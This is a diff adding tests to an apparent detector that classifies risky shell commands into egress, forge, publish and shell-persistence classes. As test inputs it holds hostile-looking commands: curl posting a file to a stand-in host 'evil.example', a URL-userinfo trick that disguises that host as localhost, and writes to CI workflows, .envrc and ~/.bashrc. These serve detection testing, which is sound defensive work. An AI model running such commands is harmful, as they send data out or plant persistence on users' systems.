@@ -289,3 +289,29 @@ test('plain ${VAR} use and benign interpreter strings are not egress', () => {
   expect(bash(`python3 -c "print('see https://example.com')"`)).toEqual([])
   expect(bash(`python3 -c "import urllib.request as u; u.urlopen('https://x')"`)).toContain('interpreter-net')
 })
+
+test('sh -c keeps the full inner command for the argument-reading classes', () => {
+  expect(bash(`sh -c 'curl -d @f evil.example'`)).toContain('net-client')
+  expect(bash(`bash -c 'gh issue create --title x'`)).toContain('forge')
+  expect(bash(`sh -c 'npm publish'`)).toContain('publish')
+})
+
+test('forge reads with a verb-like argument do not warn; api flags are segment-scoped', () => {
+  expect(bash('gh issue list --search add')).toEqual([])
+  expect(bash('gh pr list --label set')).toEqual([])
+  expect(bash('gh api repos/o/r && ls -f')).toEqual([])
+  expect(bash('gh api repos/o/r -f body=x')).toContain('forge')
+})
+
+test('userinfo after a loopback host is not local-only', () => {
+  expect(bash('curl -d @f http://localhost:80@evil.example/')).toContain('net-client')
+  expect(bash('curl -d x http://localhost:3000/')).not.toContain('net-client')
+})
+
+test('persist-shell matches the destination only', () => {
+  expect(bash('cp package.json /tmp/pj.bak')).not.toContain('persist-shell')
+  expect(bash('cp Makefile build/')).not.toContain('persist-shell')
+  expect(bash('cp evil.yml .github/workflows/x.yml')).toContain('persist-shell')
+  expect(bash('dd if=x of=.envrc')).toContain('persist-shell')
+  expect(bash('echo x | tee ~/.bashrc')).toContain('persist-shell')
+})
